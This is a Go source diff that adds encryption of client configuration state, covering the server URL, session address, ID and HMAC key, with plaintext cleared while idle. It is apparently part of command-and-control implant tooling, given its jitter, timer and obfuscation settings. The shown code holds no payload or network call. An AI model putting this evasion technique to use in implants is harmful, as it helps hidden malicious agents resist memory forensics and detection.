@@ -7,6 +7,8 @@ import (
 	"runtime"
 	"strings"
 	"sync"
+
+	"src/Client/generic/stateEncryption"
 )
 
 var (
@@ -71,4 +73,118 @@ func init() {
 	ConfigMutex.Lock()
 	Obfuscation = tmp
 	ConfigMutex.Unlock()
+
+	// Initialize state encryption on startup
+	// Note: Logging moved to main.go to avoid import cycle
+	stateEncryption.GenerateMasterKey()
+}
+
+// EnsureDecrypted ensures that the config state is decrypted before use
+// This should be called before accessing any sensitive config variables
+func EnsureDecrypted() error {
+	if stateEncryption.IsEncrypted() {
+		return DecryptConfigState()
+	}
+	return nil
+}
+
+// GetURL returns the URL, ensuring state is decrypted first
+func GetURL() (string, error) {
+	if err := EnsureDecrypted(); err != nil {
+		return "", err
+	}
+	ConfigMutex.RLock()
+	defer ConfigMutex.RUnlock()
+	return URL, nil
+}
+
+// GetSessionAddr returns the SessionAddr, ensuring state is decrypted first
+func GetSessionAddr() (string, error) {
+	if err := EnsureDecrypted(); err != nil {
+		return "", err
+	}
+	ConfigMutex.RLock()
+	defer ConfigMutex.RUnlock()
+	return SessionAddr, nil
+}
+
+// GetID returns the ID, ensuring state is decrypted first
+func GetID() (string, error) {
+	if err := EnsureDecrypted(); err != nil {
+		return "", err
+	}
+	ConfigMutex.RLock()
+	defer ConfigMutex.RUnlock()
+	return ID, nil
+}
+
+// GetHMACKey returns the HMACKey, ensuring state is decrypted first
+func GetHMACKey() (string, error) {
+	if err := EnsureDecrypted(); err != nil {
+		return "", err
+	}
+	ConfigMutex.RLock()
+	defer ConfigMutex.RUnlock()
+	return HMACKey, nil
+}
+
+// EncryptConfigState encrypts all sensitive config data when the client is idle
+func EncryptConfigState() error {
+	ConfigMutex.RLock()
+
+	// Create state snapshot
+	hostname, _ := os.Hostname()
+	state := stateEncryption.CreateState(
+		ID,
+		URL,
+		SessionAddr,
+		HMACKey,
+		hostname,
+		runtime.GOOS,
+		"", // ClientID will be generated when needed
+		Jitter,
+		Timer,
+		nil,
+	)
+	ConfigMutex.RUnlock()
+
+	// Encrypt the state
+	if err := stateEncryption.EncryptState(state); err != nil {
+		return err
+	}
+
+	// Clear sensitive config variables
+	ConfigMutex.Lock()
+	ID = ""
+	HMACKey = ""
+	URL = ""
+	SessionAddr = ""
+	ConfigMutex.Unlock()
+
+	return nil
+}
+
+// DecryptConfigState decrypts the encrypted state and restores config variables
+func DecryptConfigState() error {
+	state, err := stateEncryption.DecryptState()
+	if err != nil {
+		return err
+	}
+
+	// Restore config variables
+	ConfigMutex.Lock()
+	ID = state.ID
+	Jitter = state.Jitter
+	Timer = state.Timer
+	URL = state.URL
+	SessionAddr = state.SessionAddr
+	HMACKey = state.HMACKey
+	ConfigMutex.Unlock()
+
+	return nil
+}
+
+// IsStateEncrypted returns whether the config state is currently encrypted
+func IsStateEncrypted() bool {
+	return stateEncryption.IsEncrypted()
 }
